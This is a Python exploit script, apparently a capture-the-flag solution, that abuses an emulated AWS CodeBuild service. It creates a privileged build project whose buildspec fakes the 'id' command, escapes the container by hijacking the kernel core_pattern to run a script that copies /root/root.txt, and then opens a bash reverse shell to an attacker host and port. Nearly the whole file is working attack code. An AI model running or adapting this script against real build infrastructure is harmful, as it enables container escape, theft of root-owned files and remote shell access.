#!/usr/bin/env python3
import boto3, time

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ACCOUNT = "847219365028"
LHOST = "10.10.14.117"
LPORT = "4444"

s = boto3.Session(
    aws_access_key_id="test",
    aws_secret_access_key="test",
    region_name=REGION,
)

cb = s.client("codebuild", endpoint_url=ENDPOINT)

buildspec = f'''
version: 0.2

env:
  variables:
    BASH_FUNC_id%%: "() {{ echo uid=1000; }}"

phases:
  build:
    commands:
      - id
      - UDIR=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/self/mountinfo | head -1)
      - echo "UDIR=$UDIR"
      - printf '#!/bin/sh\\ncat /root/root.txt > %s/rootflag\\nchmod 644 %s/rootflag\\n' "$UDIR" "$UDIR" > /x.sh
      - chmod +x /x.sh
      - echo "|$UDIR/x.sh" > /proc/sys/kernel/core_pattern
      - cat /proc/sys/kernel/core_pattern
      - ulimit -c unlimited
      - bash -c 'kill -11 $$' || true
      - sleep 2
      - bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
'''

try:
    cb.delete_project(name="root")
except Exception:
    pass

cb.create_project(
    name="root",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": [{
            "name": "BASH_FUNC_id%%",
            "value": "() { echo uid=1000; }",
            "type": "PLAINTEXT"
        }],
    },
    serviceRole=f"arn:aws:iam::{ACCOUNT}:role/service-role/codebuild",
)

bid = cb.start_build(projectName="root")["build"]["id"]

while True:
    b = cb.batch_get_builds(ids=[bid])["builds"][0]
    print(b["buildStatus"])

    if b["buildStatus"] not in ("IN_PROGRESS", "QUEUED"):
        for p in b.get("phases", []):
            for c in p.get("contexts", []):
                msg = c.get("message")
                if msg:
                    print(msg)
        break

    time.sleep(2)
